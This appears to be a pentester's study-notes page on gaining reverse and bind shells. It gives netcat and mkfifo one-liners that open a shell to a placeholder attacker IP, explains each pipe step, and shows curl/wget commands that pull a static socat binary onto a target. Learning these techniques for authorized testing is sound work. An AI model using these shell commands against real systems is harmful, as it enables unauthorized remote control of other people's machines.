---
description: Reverse/bind shell
---

# Gaining shell

### Static compiled binaries

{% embed url="https://github.com/andrew-d/static-binaries/blob/master/binaries" %}

### Webshell repository in Kali Linux

`/usr/share/webshells/`

### Reverse shell

Given a scenario where an attacker has gained remote code execution privileges on a victim machine, a reverse/bind shell can be established to allow the attacker to gain a remote shell session on the victim machine.

A reverse shell works by establishing a connection from the target machine with shell execution, to a listening port on the attacker's machine. This allows any commands sent from the attacker's machine to be executed by the shell on the victim's machine, allowing a remote shell environment.

A bind shell works in an opposite way to a reverse shell, such that the connection is established from attacker machine to the target machine on a specific listening port (enabled by the attacker).&#x20;

#### Basic command on attacker machine:

```bash
# Listen on a TCP port
$ nc -lp [port]
```

#### Command to be executed on the victim's machine:

```bash
# option 1
$ nc <attacker_IP> [port] -e /bin/sh


# option 2: -e flag might not be present for some netcat versions
$ rm /tmp/fifo; mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc <attacker_IP> [port] > /tmp/fifo

```

### Bind shell

#### Basic command on attacker machine:

```bash
# Listen on a TCP port
$ nc <victim_IP> <port>
```

#### Command to be executed on the victim's machine:

```bash
# option 1
$ nc -lp [port] -e /bin/sh

# option 2: with $ symbol on attacker machine
$ rm /tmp/fifo; mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc -lp [port] > /tmp/fifo

```



### Explanation for commands use in option 2 of reverse/bind shell

_**What is a fifo (named pipe) file?**_

> ‘mkfifo’ is primarily used when two processes need to communicate with each other but do not have a parent-child relationship. A FIFO special file is an extension of pipes, which offers a pathway for data between two processes. The FIFO special file can be opened by multiple processes for reading and writing. It is especially useful in scenarios where data streaming is necessary.

{% embed url="https://hopeness.medium.com/master-the-linux-mkfifo-command-a-comprehensive-guide-7e64ac926228" %}
mkfifo command
{% endembed %}

1. `rm /tmp/fifo`: Remove the _fifo_ (named pipe) file if it already exists
2. `mkfifo /tmp/fifo:` Create a _fifo_ file at the location `/tmp/fifo` using the `mkfifo` command
3. `cat /tmp/fifo`: Retrieve content of the created _fifo_ file
4. `/bin/sh-i 2>&1:`  Simply executes the current shell, with the `-i` flag for interactive shell mode, and `2>&1` which redirects standard error to standard output, combining both output streams
5. `nc -lp [port] > /tmp/fifo`: Runs the netcat command and sends the output to `/tmp/fifo`.&#x20;

_**Overview**_

These series of commands essentially continuously waits for an input from the attacker machine, before executing it with the current shell, before sending back as input through the established _netcat_ connection:

```bash
cat /tmp/fifo | /bin/sh -i 2>&1 | nc ... > /tmp/fifo
```

a) Attacker sends remote command, which is directed to (`>`) `/tmp/fifo`

b) When the value of `/tmp/fifo`changes, the `cat` command would retrieve the new value and pipe it as input to the `/bin/sh -i 2>&1` command

c) The output from the executed shell command would be piped back as input through the _netcat_ connection to be viewed on the attacker machine



### Stable shells

Using basic methods such as netcat will generate a shell that might not be stable: terminates with ctrl+Z, non-interactive shell, etc. Alternative methods are available:

1. _**socat**_

Socat is generally more stable on Linux systems compared to Windows (target machine). As socat might not be installed on all target Linux systems, it will need to be installed. However, the common method of using `apt install` or `apt-get install` is not ideal as it requires multiple dependencies and other possible configurations.&#x20;

Instead, a static compiled binary (without dependencies) can be installed from a direct HTTP URL on the target machine using tools such as `curl` or `wget`. Link: [https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

```bash
$ curl https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true --output /bin/socat
```

```bash
$ wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true -O /bin/socat
```



_**Note**_: The output directory depends on a few factors such as the current working directory, or the value of the `$SHELL`environment variable. This is important to ensure the installed binary can be executed from the target machine.

#### Hosting the binary on a publicly accessible attacker-controlled machine

The binary can also be hosted on another attacker-controlled machine on the internet, and be accessed via a simple Python web server running on that machine.

#### Useful commands to allow smooth interactions

_**Note**_: These commands should be ran from the attacker's machine terminal, and not on the target shell  itself

1. `stty` tool

```bash
$ stty -a

# controls the registered width/height of the terminal - useful to allow smooth interactions with text editors 
$ stty cols <value>
$ sttyl rows <value>
```



{% embed url="https://tryhackme.com/r/room/introtoshells" %}

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux" %}

{% embed url="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell" %}

{% embed url="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}
